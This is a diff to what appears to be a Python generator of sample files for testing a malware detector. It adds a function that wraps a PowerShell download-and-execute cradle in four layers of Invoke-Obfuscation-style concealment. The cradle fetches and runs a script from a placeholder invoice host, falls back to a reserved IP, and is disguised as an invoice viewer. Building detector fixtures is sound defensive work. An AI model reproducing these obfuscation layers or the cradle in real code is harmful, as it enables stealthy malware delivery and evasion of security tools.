@@ -1258,6 +1258,29 @@ sh.Run(path, 0, false);
 """.encode("utf-8")
 
 
+def invoke_obfuscation_ps1() -> bytes:
+    """PowerShell launcher wrapped in four Invoke-Obfuscation-style layers (inert):
+    alias + [regex] RightToLeft reversal → wildcard command lookup (gcm *ke-e*) +
+    -replace with [char]39 → "iex" from $PSHome chars + octal codes split on '~'
+    → "iex" from $env:ComSpec[4,15,25] + reversed string. The core is an invoice
+    downloader towards *.example / RFC 5737 addresses."""
+    def lit(v: str) -> str:
+        return "'" + v.replace("'", "''") + "'"
+
+    payload = ("$u = 'http://billing.invoice-portal.example/Factura_2024-0613.pdf.ps1'\n"
+               "$c = New-Object Net.WebClient\n"
+               "$c.Headers.Add('X-Invoice', '2024-0613')\n"
+               "try { iex ($c.DownloadString($u)) } catch { iex ($c.DownloadString('http://203.0.113.17/inv.ps1')) }")
+    l1 = f"& ($env:ComSpec[4,15,25]-join'') ( -join ({lit(payload[::-1])}[-1..-{len(payload)}]) )"
+    octal = "~".join(format(ord(ch), "o") for ch in l1)
+    l2 = (f".( $PSHome[4]+$PSHome[30]+'x') ( ( '{octal}'.Split('~') | ForEach-Object "
+          "{ [char]([convert]::ToInt16($_,8)) }) -join '' )")
+    l3 = f"&(gcm *ke-e*) ( ('{l2.replace(chr(39), 'Qz7')}' -replace 'Qz7',[char]39) )"
+    l4 = (f"Set-Alias -Name pdfv -Value Invoke-Expression; "
+          f"pdfv (-join [regex]::Matches({lit(l3[::-1])},'.','RightToLeft'))")
+    return ("# Factura 2024-0613 - visor\n" + l4 + "\n").encode("utf-8")
+
+
 def build_all() -> dict[str, bytes]:
     out: dict[str, bytes] = {
         "sample.docx": word_docx(), "sample.docm": word_docm(),
@@ -1267,7 +1290,7 @@ def build_all() -> dict[str, bytes]:
         "sample_dropper.js": obf_js(), "sample_obfuscatorio.js": obf_obfuscatorio_js(),
         "sample_obf_techniques.js": obf_techniques_js(),
         "sample_chain_dropper.js": chain_dropper_js(), "sample_msxml_dropper.js": msxml_dropper_js(), "sample_wsh_selfread.js": wsh_selfread_dropper_js(), "sample_xor_stager.ps1": xor_stager_ps1(),
-        "sample_encoded_blobs.ps1": encoded_blobs_ps1(), "sample_crypto_loader.ps1": crypto_loader_ps1(),
+        "sample_encoded_blobs.ps1": encoded_blobs_ps1(), "sample_crypto_loader.ps1": crypto_loader_ps1(), "sample_invoke_obfuscation.ps1": invoke_obfuscation_ps1(),
         "sample_stage2.ps1": stage2_ps1(), "sample_dropper.vbs": dropper_vbs(),
         "sample_dropper.bat": dropper_bat(), "sample_ioc_noise.bat": ioc_noise_bat(), "sample_loader.hta": loader_hta(),
         "sample_shortcut.pdf.lnk": shortcut_lnk(), "sample_shortcut.url": internet_shortcut_url(),
